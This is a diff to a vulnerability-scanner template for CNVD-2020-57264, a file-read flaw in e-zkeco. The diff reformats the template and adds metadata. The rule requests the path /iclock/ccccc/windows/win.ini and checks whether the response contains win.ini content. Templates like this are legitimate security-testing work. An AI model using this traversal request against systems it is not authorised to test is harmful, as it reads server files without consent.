@@ -1,15 +1,24 @@
 id: CNVD-2020-57264
 
 info:
-    name: e-zkeco-CNVD-2020-57264-read-file
-    author: ThestaRY (https://github.com/ThestaRY7/)
-    severity: high
+  name: e-zkeco-iclock-fileread
+  author: ThestaRY
+  severity: high
+  verified: true
+  description: |
+    e-zkeco存在本地文件读取漏洞，攻击者可以通过构造恶意请求获取服务器上的任意文件。
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-57264
+  tags: cnvd,cnvd2020,fileread
+  created: 2020/12/15
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /iclock/ccccc/windows/win.ini
-        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+  r0:
+    request:
+      method: GET
+      path: /iclock/ccccc/windows/win.ini
+    expression: |
+      response.status == 200 &&
+      response.body.ibcontains(b"[fonts]") &&
+      response.body.ibcontains(b"[extensions]")
 expression: r0()
-
